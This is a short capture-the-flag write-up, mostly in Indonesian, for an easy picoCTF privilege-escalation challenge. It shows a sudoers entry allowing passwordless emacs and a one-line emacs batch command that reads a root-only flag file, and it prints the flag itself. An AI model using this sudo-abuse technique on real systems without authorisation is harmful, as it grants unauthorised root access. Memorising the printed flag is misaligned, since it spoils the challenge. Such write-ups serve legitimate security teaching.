# Writeup: SUDO MAKE ME A SANDWICH (Challenge ID: 735)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** General Skills / Linux Privilege Escalation
- **Difficulty:** Easy
- **Author:** CyLab Academy
- **Event:** picoCTF 2026
- **Points:** 50
- **Flag:** `academy{ju57_5ud0_17_d8ae35f9}`

---

## Deskripsi Tantangan
> Can you read the flag? I think you can!
> Hints:
> 1. What is sudo?
> 2. How do you know what permission you have?

---

## Analisis Privilage Escalation (GTFOBins Emacs Sudoers)
File `flag.txt` di direktori home dimiliki oleh `root:root` dengan permission `-r--r-----`, sehingga user biasa `ctf-player` tidak dapat membacanya secara langsung.

Pengecekan hak istimewa sudo (`sudo -l`) memperlihatkan entry sudoers:
```text
User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs
```

### Langkah Eksploitasi
Mengacu pada standar GTFOBins, binary editor `emacs` memiliki flag batch evaluation yang memungkinkan eksekusi kode elisp secara instan dengan privilege root tanpa membuka antarmuka interaktif:

```bash
sudo /bin/emacs -Q --batch --eval '(princ (with-temp-buffer (insert-file-contents "/home/ctf-player/flag.txt") (buffer-string)))'
```
*Output:* `academy{ju57_5ud0_17_d8ae35f9}`
